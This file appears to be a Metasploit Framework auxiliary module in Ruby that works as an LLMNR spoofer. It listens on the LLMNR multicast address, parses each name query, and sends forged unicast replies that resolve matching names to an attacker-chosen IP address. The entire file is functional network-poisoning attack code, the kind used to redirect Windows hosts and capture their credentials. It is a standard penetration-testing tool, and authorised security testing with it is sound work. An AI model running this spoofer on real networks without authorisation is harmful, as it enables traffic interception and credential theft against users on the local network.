##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'socket'
require 'ipaddr'

class Metasploit3 < Msf::Auxiliary

include Msf::Exploit::Capture

attr_accessor :sock, :thread


  def initialize
    super(
      'Name'		 => 'LLMNR Spoofer',
      'Description'	 => %q{
          LLMNR (Link-local Multicast Name Resolution) is the successor of NetBIOS (Windows Vista and up) and is used to
          resolve the names of neighboring computers. This module forges LLMNR responses by listening for LLMNR requests
          sent to the LLMNR multicast address (224.0.0.252) and responding with a user-defined spoofed IP address.
      },
      'Author'     => [ 'Robin Francois <rof[at]navixia.com>' ],
      'License'    => MSF_LICENSE,
      'References' =>
        [
          [ 'URL', 'http://www.ietf.org/rfc/rfc4795.txt' ]
        ],

        'Actions'     =>
        [
          [ 'Service' ]
        ],
      'PassiveActions' =>
        [
          'Service'
        ],
      'DefaultAction'  => 'Service'
    )

    register_options([
      OptAddress.new('SPOOFIP', [ true, "IP address with which to poison responses", ""]),
      OptRegexp.new('REGEX', [ true, "Regex applied to the LLMNR Name to determine if spoofed reply is sent", '.*']),
      OptInt.new('TTL', [ false, "Time To Live for the spoofed response", 300]),
    ])

    register_advanced_options([
      OptBool.new('Debug', [ false, "Determines whether incoming packet parsing is displayed", false])
    ])

    deregister_options('RHOST', 'PCAPFILE', 'SNAPLEN', 'FILTER')
    self.thread = nil
    self.sock = nil
  end

  def dispatch_request(packet, addr)
    rhost = addr[0]
    src_port = addr[1]

    # Getting info from the request packet
    llmnr_transid	   = packet[0..1]
    llmnr_flags	   = packet[2..3]
    llmnr_questions    = packet[4..5]
    llmnr_answerrr	   = packet[6..7]
    llmnr_authorityrr  = packet[8..9]
    llmnr_additionalrr = packet[10..11]
    llmnr_name_length  = packet[12..12]
    name_end =  13 + llmnr_name_length.unpack('C')[0].to_int
    llmnr_name = packet[13..name_end-1]
    llmnr_name_and_length = packet[12..name_end]
    llmnr_type = packet[name_end+1..name_end+2]
    llmnr_class = packet[name_end+3..name_end+4]

    llmnr_decodedname = llmnr_name.unpack('a*')[0].to_s

    if datastore['DEBUG']
      print_status("Received Packet from: #{rhost}:#{src_port}")
      print_status("transid:	      #{llmnr_transid.unpack('H4')}")
      print_status("tlags:	      #{llmnr_flags.unpack('B16')}")
      print_status("questions:      #{llmnr_questions.unpack('n')}")
      print_status("answerrr:       #{llmnr_answerrr.unpack('n')}")
      print_status("authorityrr:    #{llmnr_authorityrr.unpack('n')}")
      print_status("additionalrr:   #{llmnr_additionalrr.unpack('n')}")
      print_status("name length:    #{llmnr_name_length.unpack('c')}")
      print_status("name:	      #{llmnr_name.unpack('a*')}")
      print_status("decodedname:    #{llmnr_decodedname}")
      print_status("type:	      #{llmnr_type.unpack('n')}")
      print_status("class:	      #{llmnr_class.unpack('n')}")
    end

    if (llmnr_decodedname =~ /#{datastore['REGEX']}/i)
      #Header
      response =  llmnr_transid
      response << "\x80\x00" # Flags TODO add details
      response << "\x00\x01" # Questions = 1
      response << "\x00\x01" # Answer RRs = 1
      response << "\x00\x00" # Authority RRs = 0
      response << "\x00\x00" # Additional RRs = 0
      #Query part
      response << llmnr_name_and_length
      response << llmnr_type
      response << llmnr_class
      #Answer part
      response << llmnr_name_and_length
      response << llmnr_type
      response << llmnr_class
      response << [datastore['TTL']].pack("N") #Default 5 minutes
      response << "\x00\x04" # Datalength = 4
      response << Rex::Socket.addr_aton(datastore['SPOOFIP'])

      open_pcap
        # Sending UDP unicast response
        p = PacketFu::UDPPacket.new
        p.ip_saddr = Rex::Socket.source_address(rhost)
        p.ip_daddr = rhost
        p.ip_ttl = 255
        p.udp_sport = 5355 # LLMNR UDP port
        p.udp_dport = src_port	# Port used by sender
        p.payload = response
        p.recalc

        capture_sendto(p, rhost,true)
        if should_print_reply?(llmnr_decodedname)
          print_good("#{Time.now.utc} : Reply for #{llmnr_decodedname} sent to #{rhost} with spoofed IP #{datastore['SPOOFIP']}")
        end
      close_pcap
    else
      vprint_status("Packet received from #{rhost} with name #{llmnr_decodedname} did not match REGEX \"#{datastore['REGEX']}\"")
    end
  end

  def monitor_socket
    while true
      rds = [self.sock]
      wds = []
      eds = [self.sock]

      r,w,e = ::IO.select(rds,wds,eds,0.25)

      if (r != nil and r[0] == self.sock)
        packet, host, port = self.sock.recvfrom(65535)
        addr = [host,port]
        dispatch_request(packet, addr)
      end
    end
  end


  # Don't spam with success, just throttle to every 10 seconds
  # per host
  def should_print_reply?(host)
    @notified_times ||= {}
    now = Time.now.utc
    @notified_times[host] ||= now
    last_notified = now - @notified_times[host]
    if last_notified == 0 or last_notified > 10
      @notified_times[host] = now
    else
      false
    end
  end

  def run
    check_pcaprub_loaded()
    ::Socket.do_not_reverse_lookup = true

    multicast_addr = "224.0.0.252" #Multicast Address for LLMNR

    optval = ::IPAddr.new(multicast_addr).hton + ::IPAddr.new("0.0.0.0").hton
    self.sock = Rex::Socket.create_udp(
      'LocalHost' => "0.0.0.0",
      'LocalPort' =>	5355)
    self.sock.setsockopt(::Socket::SOL_SOCKET, ::Socket::SO_REUSEADDR, 1)
    self.sock.setsockopt(::Socket::IPPROTO_IP, ::Socket::IP_ADD_MEMBERSHIP, optval)


    self.thread = Rex::ThreadFactory.spawn("LLMNRServerMonitor", false) {
        monitor_socket
    }

    print_status("LLMNR Spoofer started. Listening for LLMNR requests with REGEX \"#{datastore['REGEX']}\" ...")

    add_socket(self.sock)

    while thread.alive?
      select(nil, nil, nil, 0.25)
    end

    self.thread.kill
    self.sock.close rescue nil
  end

end
